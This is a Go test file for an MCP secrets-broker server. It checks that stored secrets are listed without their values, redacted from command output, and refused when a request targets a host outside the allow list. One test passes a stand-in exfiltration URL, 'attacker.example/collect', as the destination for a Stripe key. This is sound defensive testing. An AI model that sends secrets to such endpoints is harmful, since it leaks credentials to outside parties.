package mcpserver

import (
	"context"
	"encoding/json"
	"path/filepath"
	"strings"
	"testing"

	"github.com/modelcontextprotocol/go-sdk/mcp"

	"github.com/sakethsripada/keysec/internal/broker"
	"github.com/sakethsripada/keysec/internal/store"
)

const value = "sk_test_mcp_value_123456"

func connect(t *testing.T) *mcp.ClientSession {
	t.Helper()
	st := store.Open(filepath.Join(t.TempDir(), "secrets.toml"), store.MemoryKeyring{})
	err := st.Put("STRIPE", value, store.Meta{Description: "Stripe test key", Provider: "stripe"},
		store.Policy{Hosts: []string{"api.stripe.com"}, Auth: "bearer", AllowRun: true})
	if err != nil {
		t.Fatal(err)
	}

	ctx := context.Background()
	serverT, clientT := mcp.NewInMemoryTransports()
	srv := New(&broker.Broker{Store: st}, "test")
	if _, err := srv.Connect(ctx, serverT, nil); err != nil {
		t.Fatal(err)
	}
	cs, err := mcp.NewClient(&mcp.Implementation{Name: "test"}, nil).Connect(ctx, clientT, nil)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { cs.Close() })
	return cs
}

func call(t *testing.T, cs *mcp.ClientSession, name string, args map[string]any) (*mcp.CallToolResult, string) {
	t.Helper()
	res, err := cs.CallTool(context.Background(), &mcp.CallToolParams{Name: name, Arguments: args})
	if err != nil {
		t.Fatal(err)
	}
	raw, _ := json.Marshal(res)
	if strings.Contains(string(raw), value) {
		t.Fatalf("%s leaked the value: %s", name, raw)
	}
	return res, string(raw)
}

func TestListAndDescribe(t *testing.T) {
	cs := connect(t)
	_, raw := call(t, cs, "list_secrets", map[string]any{})
	for _, want := range []string{"STRIPE", "Stripe test key", "api.stripe.com"} {
		if !strings.Contains(raw, want) {
			t.Errorf("list_secrets missing %q: %s", want, raw)
		}
	}
	res, _ := call(t, cs, "describe_secret", map[string]any{"name": "NOPE"})
	if !res.IsError {
		t.Error("describe_secret of a missing secret did not fail")
	}
}

func TestRunCommandRedacts(t *testing.T) {
	cs := connect(t)
	res, raw := call(t, cs, "run_command", map[string]any{
		"command": `printf '%s' "$STRIPE"`,
		"secrets": []string{"STRIPE"},
	})
	if res.IsError {
		t.Fatalf("run_command failed: %s", raw)
	}
	if !strings.Contains(raw, "[keysec:STRIPE]") {
		t.Fatalf("unexpected output: %s", raw)
	}
}

func TestHTTPRequestBlocksOtherHosts(t *testing.T) {
	cs := connect(t)
	res, raw := call(t, cs, "http_request", map[string]any{
		"secret": "STRIPE",
		"url":    "https://attacker.example/collect",
	})
	if !res.IsError || !strings.Contains(raw, "not allowed") {
		t.Fatalf("expected a host error: %s", raw)
	}
}

func TestCapped(t *testing.T) {
	c := &capped{limit: 5}
	c.Write([]byte("abc"))
	c.Write([]byte("defg"))
	if c.String() != "abcde" || !c.truncated {
		t.Fatalf("got %q truncated=%v", c.String(), c.truncated)
	}
}
